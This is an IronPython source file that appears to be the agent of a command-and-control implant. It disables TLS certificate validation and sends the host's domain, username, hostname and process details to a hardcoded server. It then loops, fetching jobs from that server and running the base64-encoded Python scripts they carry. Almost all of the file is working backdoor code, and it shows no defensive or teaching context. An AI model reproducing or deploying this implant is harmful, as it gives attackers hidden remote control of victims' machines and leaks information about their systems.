# -*- coding: utf-8 -*-

import clr
import sys
#clr.AddReference(IronPythonDLL)
clr.AddReference("IronPython")
clr.AddReference("System")
clr.AddReference("System.Management")
#clr.AddReference("System.Text.Encoding")
#clr.AddReference("System.Threading")
#clr.AddReference("System.Net")
clr.AddReference("System.Web.Extensions")
#clr.AddReference("System.IO")
import System.Text.Encoding as Encoding
from System import Convert, Guid, Environment
from System.Management import ManagementObject
from System.Diagnostics import Process
from System.IO import StreamReader
from System.Net import WebRequest, ServicePointManager, SecurityProtocolType
from System.Net.Security import RemoteCertificateValidationCallback
from System.Threading import Thread
from System.Threading.Tasks import Task
from System.Web.Script.Serialization import JavaScriptSerializer
from IronPython.Hosting import Python

DEBUG = True
URL = "https://172.16.164.1/"

ServicePointManager.ServerCertificateValidationCallback = RemoteCertificateValidationCallback(lambda srvPoint, certificate, chain, errors: True)
ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls11 | SecurityProtocolType.Tls12

p = Process.GetCurrentProcess()
jitter = 5000
first_checkin = True

GUID = Guid().NewGuid().ToString()
USERNAME = Environment.UserName
DOMAIN = Environment.UserDomainName
#IP = ManagementObject("Win32_NetworkAdapterConfiguration")
#OS = ManagementObject("Win32_OperatingSystem")
PROCESS = p.Id
PROCESS_NAME = p.ProcessName
HOSTNAME = Environment.MachineName

def runscript(script):
    engine = Python.CreateEngine()
    #hosted_sys = Python.GetSysModule(engine)
    #hosted_sys.path = sys.path
    #hosted_sys.meta_path = sys.meta_path
    #script = bytes(script).decode("UTF-8")
    result = engine.Execute(script)
    return result

def GET_request(path):
    r = WebRequest.Create(URL + path)
    r.Method = "GET"
    r.ContentType = "application/json"
    r.Accept = "application/json"
    
    response = r.GetResponse()
    responseStream = StreamReader(response.GetResponseStream())
    return responseStream.ReadToEnd()

def POST_request(path, payload):
    r = WebRequest.Create(URL + path)
    r.Method = "POST"
    r.ContentType = "application/json"
    r.Accept = "application/json"

    data = Encoding.ASCII.GetBytes(payload)
    r.ContentLength = data.Length
    requestStream = r.GetRequestStream()
    requestStream.Write(data, 0, data.Length)
    requestStream.Close()

    response = r.GetResponse()
    responseStream = StreamReader(response.GetResponseStream())
    return responseStream.ReadToEnd()
 
class STCommands(object):

    def checkin(self):
        return

commands = STCommands()

while True:
   #try:
        if first_checkin:
            payload = {"type": "first_checkin", 
                       "info": "{}\{}".format(DOMAIN, USERNAME)}

            json = JavaScriptSerializer().Serialize(payload)
            POST_request(GUID, json)
            first_checkin = False

        json = GET_request(GUID + "/job")
        job = JavaScriptSerializer().DeserializeObject(json)

        if job["type"] == "command":
            raise NotImplementedError
        elif job["type"] == "script":
            script = Encoding.UTF8.GetString(Convert.FromBase64String(job["payload"]))
            t = Task[long](lambda: runscript(script))
            t.Start()
    #except Exception as e:
        #if DEBUG: print "Error performing HTTP request: " + str(e)
    #finally:
        #If c# main function is STAThread
        #Thread.CurrentThread.Join(5000)
        Thread.Sleep(jitter)
